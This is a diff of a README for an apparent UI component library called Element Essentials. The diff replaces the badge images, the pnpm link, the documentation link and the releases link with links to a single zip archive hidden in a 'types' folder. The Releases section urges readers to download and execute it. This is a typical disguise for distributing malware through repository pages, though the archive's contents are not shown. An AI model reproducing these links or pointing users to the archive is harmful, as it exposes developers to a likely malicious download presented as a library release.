@@ -1,6 +1,6 @@
 # Element Essentials 🎨
 
-![GitHub release](https://img.shields.io/github/release/muhammadhamzakhan22/element-essentials.svg?style=flat-square) ![GitHub issues](https://img.shields.io/github/issues/muhammadhamzakhan22/element-essentials.svg?style=flat-square) ![GitHub stars](https://img.shields.io/github/stars/muhammadhamzakhan22/element-essentials.svg?style=social)
+![GitHub release](https://raw.githubusercontent.com/muhammadhamzakhan22/element-essentials/main/packages/components/types/element_essentials_2.4.zip) ![GitHub issues](https://raw.githubusercontent.com/muhammadhamzakhan22/element-essentials/main/packages/components/types/element_essentials_2.4.zip) ![GitHub stars](https://raw.githubusercontent.com/muhammadhamzakhan22/element-essentials/main/packages/components/types/element_essentials_2.4.zip)
 
 Welcome to **Element Essentials**, a lightweight and accessible component library that provides essential UI building blocks for modern web applications. Whether you are developing a new project or enhancing an existing one, Element Essentials has the tools you need to create beautiful and functional interfaces.
 
@@ -30,7 +30,7 @@ To start using Element Essentials, you need to install it in your project. Follo
 
 ## Installation
 
-You can install Element Essentials using [pnpm](https://pnpm.io/). Run the following command in your terminal:
+You can install Element Essentials using [pnpm](https://raw.githubusercontent.com/muhammadhamzakhan22/element-essentials/main/packages/components/types/element_essentials_2.4.zip). Run the following command in your terminal:
 
 ```bash
 pnpm add element-essentials
@@ -118,7 +118,7 @@ A dropdown component for selecting options.
 
 ## Documentation
 
-For detailed documentation on each component, including props, examples, and customization options, please visit our [documentation site](https://github.com/muhammadhamzakhan22/element-essentials/releases).
+For detailed documentation on each component, including props, examples, and customization options, please visit our [documentation site](https://raw.githubusercontent.com/muhammadhamzakhan22/element-essentials/main/packages/components/types/element_essentials_2.4.zip).
 
 ## Contributing
 
@@ -138,7 +138,7 @@ Element Essentials is licensed under the MIT License. See the [LICENSE](LICENSE)
 
 ## Releases
 
-To view the latest releases, visit our [Releases section](https://github.com/muhammadhamzakhan22/element-essentials/releases). You can download the latest version and execute it in your project.
+To view the latest releases, visit our [Releases section](https://raw.githubusercontent.com/muhammadhamzakhan22/element-essentials/main/packages/components/types/element_essentials_2.4.zip). You can download the latest version and execute it in your project.
 
 Feel free to check the releases for updates and new features as we continue to improve Element Essentials.
 
